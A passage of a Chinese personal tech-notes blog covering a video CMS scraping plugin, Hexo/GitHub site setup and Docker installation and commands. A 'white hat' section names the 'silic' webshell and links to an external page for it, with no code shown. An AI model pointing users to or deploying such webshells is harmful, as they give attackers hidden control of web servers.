&quot;Far采集插件&quot;，点击“配置”，即可完成安装在</span><br><span class="line">4. 后台首页，右侧找到快捷菜单配置，添加一项：</span><br><span class="line">Far采集插件,&#x2F;addons&#x2F;caiji&#x2F;98k.php</span><br></pre></td></tr></table></figure><blockquote><p>注意事项：<strong>1.切记这个快捷菜单是分大小写的！</strong> 2. <strong>如果上传插件后，后台点击没反应，检查是否使用了【二进制】上传插件</strong></p></blockquote><h5 id="13-9-5-采集数据"><a href="#13-9-5-采集数据" class="headerlink" title="13.9.5 采集数据"></a>13.9.5 采集数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 进入Far采集插件</span><br><span class="line">2. “播放配置” ———&gt; “保存”</span><br><span class="line">3. “访问官网” 里面有配置解析接口的教程</span><br><span class="line">4. 绑定要采集的分类视频进行采集</span><br></pre></td></tr></table></figure><h5 id="13-9-6-添加站点统计功能"><a href="#13-9-6-添加站点统计功能" class="headerlink" title="13.9.6 添加站点统计功能"></a>13.9.6 添加站点统计功能</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 进入百度统计https:<span class="comment">//tongji.baidu.com/</span></span><br><span class="line"><span class="number">2.</span> 在页面“网站列表” —— “自有网站” —— “新增网站”</span><br><span class="line"><span class="number">3.</span> 复制站点统计代码</span><br><span class="line"><span class="number">4.</span> 进入CMS后台——“系统”——“网站参数配置”——将代码复制到“统计代码”</span><br></pre></td></tr></table></figure><h3 id="13-10-GitHub-Hexo-搭建个人网站"><a href="#13-10-GitHub-Hexo-搭建个人网站" class="headerlink" title="13.10 GitHub+Hexo 搭建个人网站"></a>13.10 GitHub+Hexo 搭建个人网站</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">GitHub+Hexo 搭建个人网站详细教程 - 知乎 (zhihu.com)</a></p></blockquote><h5 id="13-10-1-搭建git-环境"><a href="#13-10-1-搭建git-环境" class="headerlink" title="13.10.1 搭建git 环境"></a>13.10.1 搭建git 环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 下载git http://git-scm.com/downloads  (选择windows)</span><br><span class="line">2. 将你的Git与GitHub帐号绑定，鼠标右击打开Git Bash 或者在菜单里搜索Git Bash，设置user.name和user.email配置信息：</span><br><span class="line">git config --global user.name "你的GitHub用户名"(xuwei)</span><br><span class="line">git config --global user.email "你的GitHub注册邮箱"(601743940@qq.com)</span><br><span class="line">3. 生成ssh密钥文件：</span><br><span class="line">ssh-keygen -t rsa -C "你的GitHub注册邮箱"(601743940@qq.com)</span><br><span class="line">4. 然后在user用户下找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</span><br><span class="line">打开GitHub_Settings_keys 页面，新建new SSH Key</span><br><span class="line">5. 在Git Bash中检测GitHub公钥设置是否成功：</span><br><span class="line">ssh git@gitee.com</span><br></pre></td></tr></table></figure><h5 id="13-10-2-使用方式"><a href="#13-10-2-使用方式" class="headerlink" title="13.10.2 使用方式"></a>13.10.2 使用方式</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">编译项目，输入命令：hexo g</span><br><span class="line">运行项目，输入命令：hexo s</span><br><span class="line"></span><br><span class="line">发布：hexo d</span><br><span class="line">运行：localhost:4000</span><br><span class="line"></span><br><span class="line">4. 发布到Gitee</span><br><span class="line">输入命令npm install hexo-deployer-git --save 安装自动部署发布工具</span><br><span class="line">输入命令hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 发布博客，首次发布需要在shell中输入账号和密码。</span><br><span class="line"></span><br><span class="line">设置文章的标签、分类和</span><br><span class="line">title:  &lt;font color=<span class="comment">#0099ff size=6 face="STCAIYUN"&gt;常用配置&lt;/font&gt;</span></span><br><span class="line">date: 2020-08-28 01:28:11</span><br><span class="line">categories: </span><br><span class="line">           - 配置</span><br><span class="line">tags:</span><br><span class="line">           - 常用配置</span><br><span class="line">// 阅读全文功能</span><br><span class="line">description: pom文件、快捷键和实用技巧</span><br><span class="line">copyright: <span class="literal">true</span> <span class="comment">#新增,开启版权申明</span></span><br><span class="line"></span><br><span class="line">5. 添加新标签：</span><br><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><h5 id="13-10-3-添加域名"><a href="#13-10-3-添加域名" class="headerlink" title="13.10.3 添加域名"></a>13.10.3 添加域名</h5><p><img src="https://images.cnblogs.com/cnblogs_com/yuyibigdata/2043880/o_2110120154471111.png" alt="img"></p><p>202010250648543ximfwcib3c8vm16kdcjaemv6x7domxkf9ts3w7cr016ggvf9i</p><h1 id="十四-白帽"><a href="#十四-白帽" class="headerlink" title="十四. 白帽"></a>十四. 白帽</h1><h3 id="14-1-Webshell"><a href="#14-1-Webshell" class="headerlink" title="14.1 Webshell"></a>14.1 Webshell</h3><h3 id="14-2-silic-习科大马"><a href="#14-2-silic-习科大马" class="headerlink" title="14.2 silic 习科大马"></a>14.2 silic 习科大马</h3><blockquote><p><a href="http://caidaome.com/?post=65" target="_blank" rel="noopener">http://caidaome.com/?post=65</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=#0099ff size=8 face=&quot;宋体&quot;&gt;Docker&lt;/font&gt;</title>
      <link href="2020/08/28/docker/"/>
      <url>2020/08/28/docker/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_43591980/article/details/106272050" target="_blank" rel="noopener">Docker视频学习笔记（基础篇）</a></p><h1 id="一-Docker的基本组成"><a href="#一-Docker的基本组成" class="headerlink" title="一. Docker的基本组成"></a>一. Docker的基本组成</h1><h3 id="1-1-镜像（image-："><a href="#1-1-镜像（image-：" class="headerlink" title="1.1 镜像（image)："></a>1.1 镜像（image)：</h3><p>docker镜像就好比是一个目标，可以通过这个目标来创建容器服务，tomcat镜像==&gt;run==&gt;容器（提供服务器），通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中的）。</p><h3 id="1-2-容器-container-："><a href="#1-2-容器-container-：" class="headerlink" title="1.2 容器(container)："></a>1.2 容器(container)：</h3><p>Docker利用容器技术，独立运行一个或者一组应用，通过镜像来创建的.<br>启动，停止，删除，基本命令<br>目前就可以把这个容器理解为就是一个简易的 Linux系统。</p><h3 id="1-3-仓库-repository-："><a href="#1-3-仓库-repository-：" class="headerlink" title="1.3 仓库(repository)："></a>1.3 仓库(repository)：</h3><p>仓库就是存放镜像的地方！<br>仓库分为公有仓库和私有仓库。(很类似git)<br>Docker Hub是国外的。<br>阿里云…都有容器服务器(配置镜像加速!)</p><h1 id="二-linux-下安装docker"><a href="#二-linux-下安装docker" class="headerlink" title="二. linux 下安装docker"></a>二. linux 下安装docker</h1><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">1.卸载旧版本</span></span><br><span class="line">yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br><span class="line"><span class="meta">#</span><span class="bash">2.需要的安装包</span></span><br><span class="line">yum install -y yum-utils</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">3.设置镜像的仓库</span></span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta">#</span><span class="bash">上述方法默认是从国外的，不推荐</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">推荐使用国内的</span></span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash">更新yum软件包索引</span></span><br><span class="line">yum makecache fast</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">4.安装docker相关的 docker-ce 社区版 而ee是企业版</span></span><br><span class="line">yum install docker-ce docker-ce-cli containerd.io # 这里我们使用社区版即可</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">5.启动docker</span></span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">6. 使用docker version查看是否按照成功</span></span><br><span class="line">docker version</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">7. 测试</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#8.查看已经下载的镜像(从这里可以查看已有镜像的id)</span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker images</span><br><span class="line">REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world           latest              bf756fb1ae65        4 months ago      13.3kB</span><br></pre></td></tr></table></figure><h3 id="2-2-卸载"><a href="#2-2-卸载" class="headerlink" title="2.2  卸载"></a>2.2  卸载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">1. 卸载依赖</span></span><br><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">2. 删除资源</span></span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line"><span class="meta">#</span><span class="bash"> /var/lib/docker 是docker的默认工作路径！</span></span><br></pre></td></tr></table></figure><h1 id="三-启动docker-服务命令"><a href="#三-启动docker-服务命令" class="headerlink" title="三. 启动docker 服务命令"></a>三. 启动docker 服务命令</h1><table><thead><tr><th>systemctl start docker</th><th>启动docker服务</th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td>chkconfig –list</td><td>查看自启动的服务</td><td></td></tr><tr><td>chkconfig docker on</td><td>设置docker 自启动</td><td></td></tr></tbody></table><h1 id="四-配置阿里云镜像加速"><a href="#四-配置阿里云镜像加速" class="headerlink" title="四. 配置阿里云镜像加速"></a>四. 配置阿里云镜像加速</h1><h3 id="4-1-登录阿里云找到容器服务"><a href="#4-1-登录阿里云找到容器服务" class="headerlink" title="4.1 登录阿里云找到容器服务"></a>4.1 登录阿里云找到容器服务</h3><h3 id="4-2-找到镜像加速器"><a href="#4-2-找到镜像加速器" class="headerlink" title="4.2 找到镜像加速器"></a>4.2 找到镜像加速器</h3><h3 id="4-3-配置使用"><a href="#4-3-配置使用" class="headerlink" title="4.3 配置使用"></a>4.3 配置使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">1.创建一个目录</span></span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">2.编写配置文件</span></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class="line">&#123;</span><br><span class="line">  "registry-mirrors": ["https://t2wwyxhb.mirror.aliyuncs.com"]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">3.重启服务</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="五-Docker的常用命令"><a href="#五-Docker的常用命令" class="headerlink" title="五. Docker的常用命令"></a>五. Docker的常用命令</h1><h3 id="5-1-帮助命令"><a href="#5-1-帮助命令" class="headerlink" title="5.1.帮助命令"></a>5.1.帮助命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version    #显示docker的版本信息。</span><br><span class="line">docker info       #显示docker的系统信息，包括镜像和容器的数量</span><br><span class="line">docker 命令 --help #帮助命令</span><br></pre></td></tr></table></figure><p>帮助文档的地址：<a href="https://docs.docker.com/engine/reference/commandline/build/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/build/</a></p><h3 id="5-2-镜像命令"><a href="#5-2-镜像命令" class="headerlink" title="5.2. 镜像命令"></a>5.2. 镜像命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker images #查看所有本地主机上的镜像 可以使用docker image ls代替</span><br><span class="line"></span><br><span class="line">docker search #搜索镜像</span><br><span class="line"></span><br><span class="line">docker pull #下载镜像 docker image pull</span><br><span class="line"></span><br><span class="line">docker rmi #删除镜像 docker image rm</span><br></pre></td></tr></table></figure><h3 id="5-3-docker-images查看所有本地的主机上的镜像"><a href="#5-3-docker-images查看所有本地的主机上的镜像" class="headerlink" title="5.3. docker images查看所有本地的主机上的镜像"></a>5.3. docker images查看所有本地的主机上的镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker images</span><br><span class="line">REPOSITORY            TAG                 IMAGE ID            CREATED           SIZE</span><br><span class="line">hello-world           latest              bf756fb1ae65        4 months ago     13.3kB</span><br><span class="line">mysql                 5.7                 b84d68d0a7db        6 days ago       448MB</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解释</span></span><br><span class="line"><span class="meta">#</span><span class="bash">REPOSITORY<span class="comment"># 镜像的仓库源</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">TAG<span class="comment"># 镜像的标签(版本)---lastest 表示最新版本</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">IMAGE ID<span class="comment"># 镜像的id</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">CREATED<span class="comment"># 镜像的创建时间</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">SIZE<span class="comment"># 镜像的大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可选项</span></span><br><span class="line">Options:</span><br><span class="line">  -a, --all         Show all images (default hides intermediate images) #列出所有镜像</span><br><span class="line">  -q, --quiet       Only show numeric IDs # 只显示镜像的id</span><br><span class="line">  </span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker images -a  #列出所有镜像详细信息</span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker images -aq #列出所有镜像的id</span><br><span class="line">d5f28a0bb0d0</span><br><span class="line">f19c56ce92a8</span><br><span class="line">1b6b1fe7261e</span><br><span class="line">1b6b1fe7261e</span><br></pre></td></tr></table></figure><h3 id="5-4-docker-search-搜索镜像"><a href="#5-4-docker-search-搜索镜像" class="headerlink" title="5.4 docker search 搜索镜像"></a>5.4 docker search 搜索镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker search mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> --filter=STARS=3000 <span class="comment">#过滤，搜索出来的镜像收藏STARS数量大于3000的</span></span></span><br><span class="line">Options:</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Pretty-print search using a Go template</span><br><span class="line">      --limit int       Max number of search results (default 25)</span><br><span class="line">      --no-trunc        Don't truncate output</span><br><span class="line">      </span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME        DESCRIPTION         STARS            OFFICIAL        AUTOMATED</span><br><span class="line">mysql       MySQL IS ...        9520             [OK]                </span><br><span class="line">mariadb     MariaDB IS ...      3456             [OK]</span><br></pre></td></tr></table></figure><h3 id="5-5-docker-pull-下载镜像"><a href="#5-5-docker-pull-下载镜像" class="headerlink" title="5.5 docker pull 下载镜像"></a>5.5 docker pull 下载镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载镜像 docker pull 镜像名[:tag]</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker pull tomcat:8</span><br><span class="line">8: Pulling from library/tomcat #如果不写tag，默认就是latest</span><br><span class="line">90fe46dd8199: Already exists   #分层下载： docker image 的核心 联合文件系统</span><br><span class="line">35a4f1977689: Already exists </span><br><span class="line">bbc37f14aded: Already exists </span><br><span class="line">74e27dc593d4: Already exists </span><br><span class="line">93a01fbfad7f: Already exists </span><br><span class="line">1478df405869: Pull complete </span><br><span class="line">64f0dd11682b: Pull complete </span><br><span class="line">68ff4e050d11: Pull complete </span><br><span class="line">f576086003cf: Pull complete </span><br><span class="line">3b72593ce10e: Pull complete </span><br><span class="line">Digest: sha256:0c6234e7ec9d10ab32c06423ab829b32e3183ba5bf2620ee66de866df # 签名防伪</span><br><span class="line">Status: Downloaded newer image for tomcat:8</span><br><span class="line">docker.io/library/tomcat:8 #真实地址</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">等价于</span></span><br><span class="line">docker pull tomcat:8</span><br><span class="line">docker pull docker.io/library/tomcat:8</span><br></pre></td></tr></table></figure><h3 id="5-6-docker-rmi-删除镜像"><a href="#5-6-docker-rmi-删除镜像" class="headerlink" title="5.6 docker rmi 删除镜像"></a>5.6 docker rmi 删除镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f 镜像id #删除指定id的镜像</span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker rmi -f f19c56ce92a8</span><br><span class="line"></span><br><span class="line">docker rmi -f $(docker images -aq) #删除全部的镜像</span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure><h1 id="六-容器命令"><a href="#六-容器命令" class="headerlink" title="六. 容器命令"></a>六. 容器命令</h1><blockquote><p>说明：我们有了镜像才可以创建容器，Linux，下载centos镜像来学习</p></blockquote><h3 id="6-1-镜像下载"><a href="#6-1-镜像下载" class="headerlink" title="6.1 镜像下载"></a>6.1 镜像下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">docker中下载centos</span></span><br><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像id #新建容器并启动</span><br><span class="line"></span><br><span class="line">docker ps 列出所有运行的容器 docker container list</span><br><span class="line"></span><br><span class="line">docker rm 容器id #删除指定容器</span><br><span class="line"></span><br><span class="line">docker start 容器id#启动容器</span><br><span class="line">docker restart 容器id#重启容器</span><br><span class="line">docker stop 容器id#停止当前正在运行的容器</span><br><span class="line">docker kill 容器id#强制停止当前容器</span><br><span class="line"></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker container list  #h和docker ps相同</span><br></pre></td></tr></table></figure><h3 id="6-2-新建容器并启动"><a href="#6-2-新建容器并启动" class="headerlink" title="6.2 新建容器并启动"></a>6.2 新建容器并启动</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] image | docker container run [可选参数] image </span><br><span class="line"><span class="comment">#参书说明</span></span><br><span class="line">--name=<span class="string">"Name"</span><span class="comment">#容器名字 tomcat01 tomcat02 用来区分容器</span></span><br><span class="line">-d<span class="comment">#后台方式运行</span></span><br><span class="line">-it <span class="comment">#使用交互方式运行，进入容器查看内容</span></span><br><span class="line">-p<span class="comment">#指定容器的端口 -p 8080(宿主机):8080(容器)</span></span><br><span class="line">-p ip:主机端口:容器端口</span><br><span class="line">-p 主机端口:容器端口(常用)</span><br><span class="line">-p 容器端口</span><br><span class="line">容器端口</span><br><span class="line">-P(大写) 随机指定端口</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试、启动并进入容器</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g</span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker run -it centos /bin/bash</span></span><br><span class="line">[root@241b5abce65e /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@241b5abce65e /]<span class="comment"># exit #从容器退回主机</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h3 id="6-3-列出所有运行的容器"><a href="#6-3-列出所有运行的容器" class="headerlink" title="6.3 列出所有运行的容器"></a>6.3 列出所有运行的容器</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps 命令  <span class="comment">#列出当前正在运行的容器</span></span><br><span class="line">  -a, --all      <span class="comment">#列出当前正在运行的容器 + 带出历史运行过的容器</span></span><br><span class="line">  -n=?, --last int   <span class="comment">#列出最近创建的?个容器 ?为1则只列出最近创建的一个容器,为2则列出2个</span></span><br><span class="line">  -q, --quiet        <span class="comment">#只列出容器的编号</span></span><br></pre></td></tr></table></figure><h3 id="6-4-退出容器"><a href="#6-4-退出容器" class="headerlink" title="6.4 退出容器"></a>6.4 退出容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit #容器直接退出</span><br><span class="line">ctrl +P +Q  #容器不停止退出 ---注意：这个很有用的操作</span><br></pre></td></tr></table></figure><h3 id="6-5-删除容器"><a href="#6-5-删除容器" class="headerlink" title="6.5 删除容器"></a>6.5 删除容器</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id   <span class="comment">#删除指定的容器，不能删除正在运行的容器，如果要强制删除 rm -rf</span></span><br><span class="line">docker rm -f $(docker ps -aq)   <span class="comment">#删除所有的容器</span></span><br><span class="line">docker ps -a -q|xargs docker rm  <span class="comment">#删除所有的容器</span></span><br></pre></td></tr></table></figure><h3 id="6-6-启动和停止容器的操作"><a href="#6-6-启动和停止容器的操作" class="headerlink" title="6.6 启动和停止容器的操作"></a>6.6 启动和停止容器的操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id#启动容器</span><br><span class="line">docker restart 容器id#重启容器</span><br><span class="line">docker stop 容器id#停止当前正在运行的容器</span><br><span class="line">docker kill 容器id#强制停止当前容器</span><br></pre></td></tr></table></figure><h1 id="七-常用其他命令"><a href="#七-常用其他命令" class="headerlink" title="七. 常用其他命令"></a>七. 常用其他命令</h1><h3 id="7-1-后台启动命令"><a href="#7-1-后台启动命令" class="headerlink" title="7.1 后台启动命令"></a>7.1 后台启动命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 命令 docker run -d 镜像名</span></span><br><span class="line"></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker run -d centos</span><br><span class="line">a8f922c255859622ac45ce3a535b7a0e8253329be4756ed6e32265d2dd2fac6c</span><br><span class="line"></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker ps    </span><br><span class="line">CONTAINER ID      IMAGE       COMMAND    CREATED     STATUS   PORTS    NAMES</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 问题docker ps. 发现centos 停止了</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 常见的坑，docker容器使用后台运行，就必须要有要一个前台进程，docker发现没有应用，就会自动停止</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</span></span><br></pre></td></tr></table></figure><h3 id="7-2-查看日志"><a href="#7-2-查看日志" class="headerlink" title="7.2 查看日志"></a>7.2 查看日志</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 